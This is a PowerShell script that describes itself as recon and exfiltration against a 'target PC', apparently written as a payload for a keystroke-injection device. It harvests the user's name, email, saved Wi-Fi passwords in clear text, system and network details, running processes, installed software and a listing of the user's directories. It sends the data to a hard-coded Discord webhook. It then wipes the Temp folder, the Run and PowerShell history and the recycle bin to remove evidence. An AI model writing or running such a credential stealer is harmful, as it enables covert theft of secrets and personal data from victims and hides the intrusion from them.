#SYNOPSIS
	#This is an advanced recon of a target PC and exfiltration of that data
#DESCRIPTION 
	#This program gathers details from PC to include everything you could imagine from wifi passwords to PC specs to every process running
	#All of the gathered information is formatted neatly and output to a file 
	#That file is then exfiltrated to Discord Webhook
##########################
# Configuration Variables
$DiscordWebhookUrl = "https://discord.com/api/webhooks/1305290003944833035/pzY6f_l01DPtZTxZnvmKQhCCieC-Z4z1yegIXySBcxIPoZhrN-npmasRTFSuk3fflQGW"
$OutputFileName = "$env:USERNAME-$(Get-Date -Format yyyy-MM-dd_hh-mm)_computer_recon.txt"
$OutputFilePath = "$env:TEMP\$OutputFileName"
##########################
 function Get-fullName {
    try {
    $fullName = Net User $Env:username | Select-String -Pattern "Full Name";$fullName = ("$fullName").TrimStart("Full Name")
    }
  # If no name is detected, the function will return $env:UserName 
    # Write Error is just for troubleshooting 
    catch {Write-Error "No name was detected" 
    return $env:UserName
    -ErrorAction SilentlyContinue
    }
    return $fullName 
}
$FN = Get-fullName
##########################
function Get-email {
        try {
    $email = GPRESULT -Z /USER $Env:username | Select-String -Pattern "([a-zA-Z0-9_\-\.]+)@([a-zA-Z0-9_\-\.]+)\.([a-zA-Z]{2,5})" -AllMatches;$email = ("$email").Trim()
	return $email
    }
# If no email is detected function will return backup message for sapi speak
    # Write Error is just for troubleshooting
    catch {Write-Error "An email was not found" 
    return "No Email Detected"
    -ErrorAction SilentlyContinue
    }        
}
$EM = Get-email
##########################
function Get-WifiPasswords {
    try {
        # Get Wi-Fi profiles using netsh
        $profiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object {
            $_ -match ':\s*(.+)$' | Out-Null
            $profile = $matches[1].Trim()
            # Use a timeout for retrieving passwords
            $keyContent = ""
            $startTime = Get-Date
            while ($keyContent -eq "" -and ((Get-Date) - $startTime).TotalSeconds -lt 5) {
                try {
                    $keyContent = netsh wlan show profile "$profile" key=clear | Select-String "Key Content"
                } catch {
                    Write-Error ("Failed to retrieve Wi-Fi password for {0}" -f $profile)
                    break
                }
            }
            # Return the profile name and password if found
            if ($keyContent) {
                "{0}: {1}" -f ${profile}, ($keyContent -replace 'Key Content\s*:\s*', '')
            } else {
                "{0}: No password found or access denied" -f ${profile}
            }
        }
        return ${profiles} -join "n"
    } catch {
        return "No Wi-Fi profiles found or access denied."
    }
}
##########################
# Get info about PC: local IP addresses using Get-CimInstance
try {
    $computerIPs = Get-CimInstance Win32_NetworkAdapterConfiguration | Where-Object { $_.IPEnabled -eq $true } | Select-Object -ExpandProperty IPAddress
    #$localIP = (ipconfig | Select-String -Pattern "IPv4").Line -split ":\s*" | Select-Object -Last 1
    if ($computerIPs) {
        $localIP = $computerIPs -join ", "
    } else {
        $localIP = "No IP addresses found"
    }
} catch {
    $localIP = "Error getting local IP addresses"
}
# Retrieve local IP addresses using Get-CimInstance
try {
    $computerIPs = Get-CimInstance Win32_NetworkAdapterConfiguration | Where-Object { $_.IPEnabled -eq $true } | Select-Object -ExpandProperty IPAddress
    $localIP = $computerIPs -join ", "
} catch {
    $localIP = "Error getting local IP addresses"
}
# Check if DHCP is enabled and retrieve the MAC address
$IsDHCPEnabled = $false
try {
    $Networks = Get-CimInstance Win32_NetworkAdapterConfiguration | Where-Object { $_.DHCPEnabled -eq $true }
    if ($Networks) {
        $IsDHCPEnabled = $true
    }
    # Retrieve the MAC address
    $MAC = Get-NetAdapter | Where-Object { $_.Status -eq "Up" } | Select-Object -First 1 -ExpandProperty MacAddress
    #$MAC = (getmac | Select-String -Pattern "Physical").Line -split "\s+" | Select-Object -First 1
} catch {
    $MAC = "Error getting MAC address"
}
# Retrieve Network Info
try {
    #$computerPubIP = (Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content.Trim()
    $computerPubIP = curl ipinfo.io/ip
    $computerIPs = Get-CimInstance Win32_NetworkAdapterConfiguration | Where-Object { $_.IPEnabled -eq $true } | Select-Object -ExpandProperty IPAddress
    $localIP = $computerIPs -join ", "
    $MAC = Get-NetAdapter | Where-Object { $_.Status -eq "Up" } | Select-Object -First 1 -ExpandProperty MacAddress
    $IsDHCPEnabled = ($computerIPs.Count -gt 0)
} catch {
    $computerPubIP = "Error getting Public IP"
    $localIP = "Error getting Local IP"
    $MAC = "Error getting MAC address"
    #$IsDHCPEnabled = $false
}

Write-Host "Building System Details..."
# System Info Retrieval (Updated)
try {
    $hostname = $env:COMPUTERNAME
    $os = (Get-CimInstance -ClassName Win32_OperatingSystem).Caption
    $osVersion = (Get-CimInstance -ClassName Win32_OperatingSystem).Version
    $cpu = (Get-CimInstance -ClassName Win32_Processor).Name
    $ram = [math]::round((Get-CimInstance -ClassName Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 2)
    $bios = (Get-CimInstance -ClassName Win32_BIOS).SMBIOSBIOSVersion
    $mac = (Get-NetAdapter | Where-Object { $_.Status -eq "Up" }).MacAddress
    $localIP = (Get-NetIPAddress | Where-Object { $_.AddressFamily -eq 'IPv4' -and $_.InterfaceAlias -notlike '*Loopback*' }).IPAddress -join ", "
    $publicIP = (curl ipinfo.io/ip).Content.Trim()

# Construct System Details
    $SystemDetails = @"
Hostname: $hostname
OS: $os
OS Version: $osVersion
CPU: $cpu
RAM: $ram GB
BIOS Version: $bios
Local IP Address: $localIP
MAC Address: $mac
Public IP: $publicIP
"@
} catch {
    $SystemDetails = "Error: Unable to retrieve full system details. Exception: $($_.Exception.Message)"
}

# Output or Send via Discord Webhook
Write-Output $systemInfo
##########################
# Get HDDs
$driveType = @{
   2="Removable disk "
   3="Fixed local disk "
   4="Network disk "
   5="Compact disk "}
$Hdds = Get-WmiObject Win32_LogicalDisk | select DeviceID, VolumeName, @{Name="DriveType";Expression={$driveType.item([int]$_.DriveType)}}, FileSystem,VolumeSerialNumber,@{Name="Size_GB";Expression={"{0:N1} GB" -f ($_.Size / 1Gb)}}, @{Name="FreeSpace_GB";Expression={"{0:N1} GB" -f ($_.FreeSpace / 1Gb)}}, @{Name="FreeSpace_percent";Expression={"{0:N1}%" -f ((100 / ($_.Size / $_.FreeSpace)))}} | Format-Table DeviceID, VolumeName,DriveType,FileSystem,VolumeSerialNumber,@{ Name="Size GB"; Expression={$_.Size_GB}; align="right"; }, @{ Name="FreeSpace GB"; Expression={$_.FreeSpace_GB}; align="right"; }, @{ Name="FreeSpace %"; Expression={$_.FreeSpace_percent}; align="right"; }
#Get - Com & Serial Devices
$COMDevices = Get-Wmiobject Win32_USBControllerDevice | ForEach-Object{[Wmi]($_.Dependent)} | Select-Object Name, DeviceID, Manufacturer | Sort-Object -Descending Name | Format-Table
# Check RDP
<#$RDP
if ((Get-ItemProperty "hklm:\System\CurrentControlSet\Control\Terminal Server").fDenyTSConnections -eq 0) { 
	$RDP = "RDP is Enabled" 
} else {
	$RDP = "RDP is NOT enabled" 
}#>
##########################
# Get Network Interfaces
$Network = Get-WmiObject Win32_NetworkAdapterConfiguration | where { $_.MACAddress -notlike $null }  | select Index, Description, IPAddress, DefaultIPGateway, MACAddress | Format-Table Index, Description, IPAddress, DefaultIPGateway, MACAddress 
# Get wifi SSIDs and Passwords	
$WLANProfileNames =@()
#Get all the WLAN profile names
$Output = netsh.exe wlan show profiles | Select-String -pattern " : "
#Trim the output to receive only the name
Foreach($WLANProfileName in $Output){
    $WLANProfileNames += (($WLANProfileName -split ":")[1]).Trim()
}
$WLANProfileObjects =@()
#Bind the WLAN profile names and also the password to a custom object
Foreach($WLANProfileName in $WLANProfileNames){
    #get the output for the specified profile name and trim the output to receive the password if there is no password it will inform the user
    try{
        $WLANProfilePassword = (((netsh.exe wlan show profiles name="$WLANProfileName" key=clear | select-string -Pattern "Key Content") -split ":")[1]).Trim()
    }Catch{
        $WLANProfilePassword = "The password is not stored in this profile"
    }
    #Build the object and add this to an array
    $WLANProfileObject = New-Object PSCustomobject 
    $WLANProfileObject | Add-Member -Type NoteProperty -Name "ProfileName" -Value $WLANProfileName
    $WLANProfileObject | Add-Member -Type NoteProperty -Name "ProfilePassword" -Value $WLANProfilePassword
    $WLANProfileObjects += $WLANProfileObject
    Remove-Variable WLANProfileObject
}
##########################
# local-user
$luser=Get-WmiObject -Class Win32_UserAccount | Format-Table Caption, Domain, Name, FullName, SID

# process first
$process=Get-WmiObject win32_process | select Handle, ProcessName, ExecutablePath, CommandLine

# Get Listeners / ActiveTcpConnections
$listener = Get-NetTCPConnection | select @{Name="LocalAddress";Expression={$_.LocalAddress + ":" + $_.LocalPort}}, @{Name="RemoteAddress";Expression={$_.RemoteAddress + ":" + $_.RemotePort}}, State, AppliedSetting, OwningProcess
$listener = $listener | foreach-object {
    $listenerItem = $_
    $processItem = ($process | where { [int]$_.Handle -like [int]$listenerItem.OwningProcess })
    new-object PSObject -property @{
      "LocalAddress" = $listenerItem.LocalAddress
      "RemoteAddress" = $listenerItem.RemoteAddress
      "State" = $listenerItem.State
      "AppliedSetting" = $listenerItem.AppliedSetting
      "OwningProcess" = $listenerItem.OwningProcess
      "ProcessName" = $processItem.ProcessName
    }
} | select LocalAddress, RemoteAddress, State, AppliedSetting, OwningProcess, ProcessName | Sort-Object LocalAddress | Format-Table 
# process last
$process = $process | Sort-Object ProcessName | Format-Table Handle, ProcessName, ExecutablePath, CommandLine
# service
$service=Get-WmiObject win32_service | select State, Name, DisplayName, PathName, @{Name="Sort";Expression={$_.State + $_.Name}} | Sort-Object Sort | Format-Table State, Name, DisplayName, PathName
# installed software (get uninstaller)
$software=Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | where { $_.DisplayName -notlike $null } |  Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Sort-Object DisplayName | Format-Table -AutoSize
# drivers
$drivers=Get-WmiObject Win32_PnPSignedDriver| where { $_.DeviceName -notlike $null } | select DeviceName, FriendlyName, DriverProviderName, DriverVersion
# videocard
$videocard=Get-WmiObject Win32_VideoController | Format-Table Name, VideoProcessor, DriverVersion, CurrentHorizontalResolution, CurrentVerticalResolution
##########################
# MAKE LOOT FOLDER 
$FileName = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_computer_recon.txt"
##########################
# OUTPUTS RESULTS TO LOOT FILE
Clear-Host
Write-Host 
echo "Name:" >> $env:TMP\$FileName
echo "==================================================================" >> $env:TMP\$FileName
echo $FN >> $env:TMP\$FileName
echo "" >> $env:TMP\$FileName
echo "Email:" >> $env:TMP\$FileName
echo "==================================================================" >> $env:TMP\$FileName
echo $EM >> $env:TMP\$FileName
echo "" >> $env:TMP\$FileName
#echo "GeoLocation:" >> $env:TMP\$FileName
#echo "==================================================================" >> $env:TMP\$FileName
#echo $GL >> $env:TMP\$FileName
echo "" >> $env:TMP\$FileName
echo "Nearby Wifi:" >> $env:TMP\$FileName
echo "==================================================================" >> $env:TMP\$FileName
echo $NearbyWifi >> $env:TMP\$FileName
echo "" >> $env:TMP\$FileName
$computerSystem.Name >> $env:TMP\$FileName
"==================================================================
Manufacturer: " + $computerSystem.Manufacturer >> $env:TMP\$FileName
"Model: " + $computerSystem.Model >> $env:TMP\$FileName
"Serial Number: " + $computerBIOS.SerialNumber >> $env:TMP\$FileName
"" >> $env:TMP\$FileName
"" >> $env:TMP\$FileName
"" >> $env:TMP\$FileName

"OS:
=================================================================="+ ($computerOs |out-string) >> $env:TMP\$FileName

"CPU:
=================================================================="+ ($computerCpu| out-string) >> $env:TMP\$FileName

"RAM:
==================================================================
Capacity: " + $computerRamCapacity+ ($computerRam| out-string) >> $env:TMP\$FileName

"Mainboard:
=================================================================="+ ($computerMainboard| out-string) >> $env:TMP\$FileName

"Bios:
=================================================================="+ (Get-WmiObject win32_bios| out-string) >> $env:TMP\$FileName


"Local-user:
=================================================================="+ ($luser| out-string) >> $env:TMP\$FileName

"HDDs:
=================================================================="+ ($Hdds| out-string) >> $env:TMP\$FileName

"COM & SERIAL DEVICES:
==================================================================" + ($COMDevices | Out-String) >> $env:TMP\$FileName

"Network: 
==================================================================
Computers MAC address: " + $MAC >> $env:TMP\$FileName
"Local IP address(es): $localIP" >> $env:TMP\$FileName
"Public IP address: " + $computerPubIP >> $env:TMP\$FileName
"RDP: " + $RDP >> $env:TMP\$FileName
"" >> $env:TMP\$FileName
($Network| out-string) >> $env:TMP\$FileName

"W-Lan profiles: 
=================================================================="+ ($WLANProfileObjects| Out-String) >> $env:TMP\$FileName

"listeners / ActiveTcpConnections
=================================================================="+ ($listener| Out-String) >> $env:TMP\$FileName

"Current running process: 
=================================================================="+ ($process| Out-String) >> $env:TMP\$FileName

"Services: 
=================================================================="+ ($service| Out-String) >> $env:TMP\$FileName

"Installed software:
=================================================================="+ ($software| Out-String) >> $env:TMP\$FileName

"Installed drivers:
=================================================================="+ ($drivers| Out-String) >> $env:TMP\$FileName

"Installed videocards:
==================================================================" + ($videocard| Out-String) >> $env:TMP\$FileName

############################################################################################################################################################
# Recon all User Directories
#tree $Env:userprofile /a /f | Out-File -FilePath $Env:tmp\j-loot\tree.txt
tree $Env:userprofile /a /f >> $env:TMP\$FileName
############################################################################################################################################################

# Remove Variables

Remove-Variable -Name computerPubIP,
computerIP,IsDHCPEnabled,Network,Networks, 
computerMAC,computerSystem,computerBIOS,computerOs,
computerCpu, computerMainboard,computerRamCapacity,
computerRam,driveType,Hdds,RDP,WLANProfileNames,WLANProfileName,
Output,WLANProfileObjects,WLANProfilePassword,WLANProfileObject,luser,
process,listener,listenerItem,process,service,software,drivers,videocard,
vault -ErrorAction SilentlyContinue -Force

############################################################################################################################################################

# Debug: Output the length of SystemInfo
Write-Host "Length of SystemInfo: $($SystemInfo.Length)"
function Send-ToDiscord {
    param ($Message)
    # Debug: Output the message length to the console
    Write-Host "Sending message to Discord. Length: $($Message.Length)"
    # Construct the JSON payload
    $payload = @{ content = "$Message" } | ConvertTo-Json
    try {
        # Send the message to Discord
        Invoke-RestMethod -Uri $DiscordWebhookUrl -Method Post -ContentType 'application/json' -Body $payload
        Write-Host "Message sent to Discord successfully."
    } catch {
        Write-Error "Failed to send message to Discord."
        Write-Error $_.Exception.Message
    }
}

# Main Script: Construct Full System Information
$FullName = Get-FullName
$Email = Get-Email
$HostName = $env:COMPUTERNAME
$WiFiPasswords = Get-WifiPasswords

$SystemInfo = @"
User: $FullName
Email: $Email
Hostname: $HostName
System Details:
$SystemDetails

Wi-Fi Passwords:
$WiFiPasswords
"@

# Send the Full System Info to Discord
Send-ToDiscord -Message $SystemInfo

##########################

#This is to clean up behind you and remove any evidence 

# Delete contents of Temp folder 

rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue

# Delete run box history

reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

# Delete powershell history

Remove-Item (Get-PSreadlineOption).HistorySavePath

# Deletes contents of recycle bin

Clear-RecycleBin -Force -ErrorAction SilentlyContinue

		
##########################

# Popup message to signal the payload is done

$done = New-Object -ComObject Wscript.Shell
$done.Popup("script is done",1)
